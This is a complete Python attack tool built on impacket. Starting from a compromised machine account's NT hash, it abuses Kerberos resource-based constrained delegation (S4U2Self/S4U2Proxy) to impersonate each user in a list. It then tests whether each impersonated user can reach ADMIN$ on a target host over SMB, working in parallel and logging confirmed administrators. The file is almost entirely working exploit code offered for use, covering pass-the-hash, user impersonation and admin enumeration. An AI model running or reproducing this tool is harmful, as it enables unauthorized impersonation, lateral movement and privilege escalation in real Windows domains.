import argparse
import datetime
import random
import struct
import sys
import threading
import concurrent.futures as cf
from binascii import unhexlify

try:
    from tqdm import tqdm
except ImportError:
    sys.exit("[!] tqdm required:  pip install tqdm")

try:
    from pyasn1.codec.der import decoder, encoder
    from pyasn1.type.univ import noValue
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import (AP_REQ, AS_REP, TGS_REQ, TGS_REP, Authenticator,
                                    PA_FOR_USER_ENC, PA_PAC_OPTIONS, EncTGSRepPart,
                                    Ticket as TicketAsn1, seq_set, seq_set_iter)
    from impacket.krb5.types import Principal, Ticket, KerberosTime
    from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, KerberosError
    from impacket.krb5.crypto import _HMACMD5, Key, _enctype_table
    from impacket.smbconnection import SMBConnection
except ImportError as e:
    sys.exit(f"[!] impacket required:  pip install impacket   ({e})")


# ---------------------------------------------------------------------------#
#  Shared, read-only context populated once at startup.                       #
# ---------------------------------------------------------------------------#
class Ctx:
    __slots__ = ("tgt", "cipher", "session_key", "domain", "machine_account",
                 "spn", "kdc", "target", "target_ip", "port", "timeout")


# ---------------------------------------------------------------------------#
#  S4U2Self + S4U2Proxy (RBCD). Faithful to impacket getST.py's doS4U.         #
#  Returns (encoded_TGS, cipher_for_that_TGS, session_key_of_that_TGS).        #
# ---------------------------------------------------------------------------#
def do_s4u(impersonate, ctx):
    domain = ctx.domain
    decodedTGT = decoder.decode(ctx.tgt, asn1Spec=AS_REP())[0]

    def _fresh_apreq_from_tgt():
        tkt = Ticket()
        tkt.from_asn1(decodedTGT["ticket"])
        ap = AP_REQ()
        ap["pvno"] = 5
        ap["msg-type"] = int(constants.ApplicationTagNumbers.AP_REQ.value)
        ap["ap-options"] = constants.encodeFlags([])
        seq_set(ap, "ticket", tkt.to_asn1)
        auth = Authenticator()
        auth["authenticator-vno"] = 5
        auth["crealm"] = str(decodedTGT["crealm"])
        cname = Principal()
        cname.from_asn1(decodedTGT, "crealm", "cname")
        seq_set(auth, "cname", cname.components_to_asn1)
        now = datetime.datetime.utcnow()
        auth["cusec"] = now.microsecond
        auth["ctime"] = KerberosTime.to_asn1(now)
        enc = ctx.cipher.encrypt(ctx.session_key, 7, encoder.encode(auth), None)
        ap["authenticator"] = noValue
        ap["authenticator"]["etype"] = ctx.cipher.enctype
        ap["authenticator"]["cipher"] = enc
        return encoder.encode(ap)

    # ----------------------------- S4U2Self ------------------------------- #
    tgsReq = TGS_REQ()
    tgsReq["pvno"] = 5
    tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgsReq["padata"] = noValue
    tgsReq["padata"][0] = noValue
    tgsReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq["padata"][0]["padata-value"] = _fresh_apreq_from_tgt()

    # PA-FOR-USER checksum (KERB_CHECKSUM_HMAC_MD5, msg type 17)
    s4u_bytes = struct.pack("<I", constants.PrincipalNameType.NT_PRINCIPAL.value)
    s4u_bytes += impersonate.encode("utf-8") + domain.encode("utf-8") + b"Kerberos"
    checksum = _HMACMD5.checksum(ctx.session_key, 17, s4u_bytes)

    pfu = PA_FOR_USER_ENC()
    seq_set(pfu, "userName",
            Principal(impersonate,
                      type=constants.PrincipalNameType.NT_PRINCIPAL.value).components_to_asn1)
    pfu["userRealm"] = domain
    pfu["cksum"] = noValue
    pfu["cksum"]["cksumtype"] = int(constants.ChecksumTypes.hmac_md5.value)
    pfu["cksum"]["checksum"] = checksum
    pfu["auth-package"] = "Kerberos"

    tgsReq["padata"][1] = noValue
    tgsReq["padata"][1]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
    tgsReq["padata"][1]["padata-value"] = encoder.encode(pfu)

    body = seq_set(tgsReq, "req-body")
    body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.canonicalize.value,
    ])
    seq_set(body, "sname",
            Principal(ctx.machine_account,
                      type=constants.PrincipalNameType.NT_UNKNOWN.value).components_to_asn1)
    body["realm"] = str(decodedTGT["crealm"])
    body["till"] = KerberosTime.to_asn1(datetime.datetime.utcnow() + datetime.timedelta(days=1))
    body["nonce"] = random.getrandbits(31)
    seq_set_iter(body, "etype",
                 (int(ctx.cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

    r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
    tgs_self = decoder.decode(r, asn1Spec=TGS_REP())[0]

    # ---------------------------- S4U2Proxy ------------------------------- #
    self_ticket = Ticket()
    self_ticket.from_asn1(tgs_self["ticket"])

    tgsReq = TGS_REQ()
    tgsReq["pvno"] = 5
    tgsReq["msg-type"] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
    tgsReq["padata"] = noValue
    tgsReq["padata"][0] = noValue
    tgsReq["padata"][0]["padata-type"] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
    tgsReq["padata"][0]["padata-value"] = _fresh_apreq_from_tgt()

    # PA-PAC-OPTIONS with the resource-based-constrained-delegation bit: this is
    # what makes RBCD (rather than classic msDS-AllowedToDelegateTo) work.
    pac_opts = PA_PAC_OPTIONS()
    pac_opts["flags"] = constants.encodeFlags(
        (constants.PAPacOptions.resource_based_constrained_delegation.value,))
    tgsReq["padata"][1] = noValue
    tgsReq["padata"][1]["padata-type"] = constants.PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
    tgsReq["padata"][1]["padata-value"] = encoder.encode(pac_opts)

    body = seq_set(tgsReq, "req-body")
    body["kdc-options"] = constants.encodeFlags([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.cname_in_addl_tkt.value,   # S4U2Proxy
        constants.KDCOptions.canonicalize.value,
    ])
    seq_set(body, "sname",
            Principal(ctx.spn, type=constants.PrincipalNameType.NT_SRV_INST.value).components_to_asn1)
    body["realm"] = domain
    seq_set_iter(body, "additional-tickets", (self_ticket.to_asn1(TicketAsn1()),))
    body["till"] = KerberosTime.to_asn1(datetime.datetime.utcnow() + datetime.timedelta(days=1))
    body["nonce"] = random.getrandbits(31)
    seq_set_iter(body, "etype",
                 (int(constants.EncryptionTypes.rc4_hmac.value),
                  int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                  int(constants.EncryptionTypes.des_cbc_md5.value),
                  int(ctx.cipher.enctype)))

    r = sendReceive(encoder.encode(tgsReq), domain, ctx.kdc)
    tgs_proxy = decoder.decode(r, asn1Spec=TGS_REP())[0]

    # The TGS-REP enc-part is sealed with the TGT session key (usage 8, no subkey).
    plain = ctx.cipher.decrypt(ctx.session_key, 8, tgs_proxy["enc-part"]["cipher"])
    enc_part = decoder.decode(plain, asn1Spec=EncTGSRepPart())[0]
    keytype = int(enc_part["key"]["keytype"])
    new_key = Key(keytype, bytes(enc_part["key"]["keyvalue"].asOctets()))
    new_cipher = _enctype_table[keytype]
    return r, new_cipher, new_key


# ---------------------------------------------------------------------------#
#  Per-user worker: S4U -> SMB kerberos login -> ADMIN$ tree connect.         #
# ---------------------------------------------------------------------------#
def process(user, ctx):
    try:
        tgs, cipher, sess = do_s4u(user, ctx)
    except KerberosError as e:
        return user, "noticket", _kerr(e)
    except Exception as e:                       # noqa: BLE001
        return user, "error", f"s4u: {e}"

    smb = None
    try:
        smb = SMBConnection(ctx.target, ctx.target_ip, sess_port=ctx.port,
                            timeout=ctx.timeout)
        smb.kerberosLogin(user, "", ctx.domain, "", "", "", ctx.kdc,
                          TGS={"KDC_REP": tgs, "cipher": cipher, "sessionKey": sess},
                          useCache=False)
        try:
            tid = smb.connectTree("ADMIN$")
            smb.disconnectTree(tid)
            return user, "admin", ""
        except Exception:                        # ADMIN$ denied => not admin
            return user, "notadmin", ""
    except KerberosError as e:
        return user, "noticket", _kerr(e)
    except Exception as e:                        # noqa: BLE001
        return user, "error", f"smb: {e}"
    finally:
        if smb is not None:
            try:
                smb.close()
            except Exception:
                pass


def _kerr(e):
    try:
        return e.getErrorString()[1]
    except Exception:
        return str(e)


# ---------------------------------------------------------------------------#
def parse_hash(h):
    h = h.strip()
    lm, nt = (h.split(":", 1) + [""])[:2] if ":" in h else ("", h)
    lm = lm.strip() or "aad3b435b51404eeaad3b435b51404ee"
    return unhexlify(lm), unhexlify(nt.strip())


def load_lines(path):
    seen, out = set(), []
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            v = line.strip()
            if v and not v.startswith("#") and v not in seen:
                seen.add(v)
                out.append(v)
    return out


def load_done(path):
    import os
    if not path or not os.path.exists(path):
        return set()
    done = set()
    with open(path, encoding="utf-8", errors="ignore") as f:
        for line in f:
            tok = line.strip().split("\t")
            if tok and tok[0]:
                done.add(tok[0])
    return done


def main():
    p = argparse.ArgumentParser(
        description="Pure-impacket parallel local-admin discovery via RBCD/S4U.")
    p.add_argument("--target", required=True,
                   help="Target FQDN used for the cifs SPN, e.g. host.corp.local")
    p.add_argument("--target-ip", default=None,
                   help="Target IP (defaults to --target if resolvable).")
    p.add_argument("--domain", required=True, help="Kerberos realm, e.g. CORP.LOCAL")
    p.add_argument("--account", required=True, help="Controlled machine account, e.g. 'OWNED$'")
    p.add_argument("--hash", required=True, help="NT hash of the account (LM:NT or :NT).")
    p.add_argument("--dc-ip", required=True, help="Domain controller IP/host (KDC).")
    p.add_argument("--users", required=True, help="File: one AD user per line.")
    p.add_argument("--output", default="admins.txt", help="Append confirmed admins here.")
    p.add_argument("--spn", default=None, help="Override SPN (default cifs/<target>).")
    p.add_argument("--workers", type=int, default=20,
                   help="Concurrent workers (default 20). This hammers the DC; tune it.")
    p.add_argument("--port", type=int, default=445, help="SMB port (default 445).")
    p.add_argument("--timeout", type=int, default=10, help="SMB timeout seconds (default 10).")
    p.add_argument("--resume", action="store_true",
                   help="Skip users already present in --output.")
    p.add_argument("--errors-file", default="", help="Optional file to log errored users.")
    p.add_argument("--verbose-noticket", action="store_true",
                   help="Also print users for whom no ticket could be obtained.")
    args = p.parse_args()

    domain = args.domain.upper()
    lmhash, nthash = parse_hash(args.hash)

    # ---- one-time TGT for the machine account (shared, read-only) ----
    print(f"[i] Requesting TGT for {args.account}@{domain} ...")
    try:
        tgt, cipher, _old, sess = getKerberosTGT(
            Principal(args.account, type=constants.PrincipalNameType.NT_PRINCIPAL.value),
            "", domain, lmhash, nthash, b"", args.dc_ip)
    except Exception as e:                        # noqa: BLE001
        sys.exit(f"[!] Could not get TGT for the machine account: {e}")
    print("[i] TGT OK.")

    ctx = Ctx()
    ctx.tgt, ctx.cipher, ctx.session_key = tgt, cipher, sess
    ctx.domain = domain
    ctx.machine_account = args.account
    ctx.spn = args.spn or f"cifs/{args.target}"
    ctx.kdc = args.dc_ip
    ctx.target = args.target
    ctx.target_ip = args.target_ip or args.target
    ctx.port = args.port
    ctx.timeout = args.timeout

    users = load_lines(args.users)
    if args.resume:
        done = load_done(args.output)
        before = len(users)
        users = [u for u in users if u not in done]
        if before != len(users):
            print(f"[i] Resume: skipping {before - len(users)} already-done users.")
    if not users:
        print("[i] Nothing to do.")
        return

    print(f"[i] {len(users)} users | spn={ctx.spn} | workers={args.workers}")
    print(f"[i] Admins -> {args.output}\n")

    admins, errors, noticket = [], [], []
    file_lock = threading.Lock()
    out_fh = open(args.output, "a", encoding="utf-8")

    executor = cf.ThreadPoolExecutor(max_workers=args.workers)
    futures = {executor.submit(process, u, ctx): u for u in users}
    bar = tqdm(total=len(futures), unit="usr", dynamic_ncols=True, desc="checking")
    try:
        for fut in cf.as_completed(futures):
            user, status, detail = fut.result()
            if status == "admin":
                admins.append(user)
                with file_lock:
                    out_fh.write(f"{user}\n")
                    out_fh.flush()
                tqdm.write(f"[+] ADMIN     {user}")
            elif status == "error":
                errors.append((user, detail))
            elif status == "noticket":
                noticket.append((user, detail))
                if args.verbose_noticket:
                    tqdm.write(f"[-] noticket  {user}  ({detail})")
            bar.set_postfix(adm=len(admins), notk=len(noticket), err=len(errors))
            bar.update(1)
    except KeyboardInterrupt:
        tqdm.write("\n[!] Interrupted; cancelling pending work.")
        executor.shutdown(cancel_futures=True)
    finally:
        bar.close()
        out_fh.close()
        executor.shutdown(wait=False)

    if args.errors_file and (errors or noticket):
        with open(args.errors_file, "w", encoding="utf-8") as ef:
            for u, d in errors:
                ef.write(f"error\t{u}\t{d}\n")
            for u, d in noticket:
                ef.write(f"noticket\t{u}\t{d}\n")

    print("\n=== Summary ===")
    print(f"  Admins   : {len(admins)}")
    print(f"  No ticket: {len(noticket)}  (Protected Users / sensitive / not delegatable)")
    print(f"  Errors   : {len(errors)}")
    if admins:
        head = ", ".join(admins[:25])
        print("  ->", head + (" ..." if len(admins) > 25 else ""))


if __name__ == "__main__":
    main()
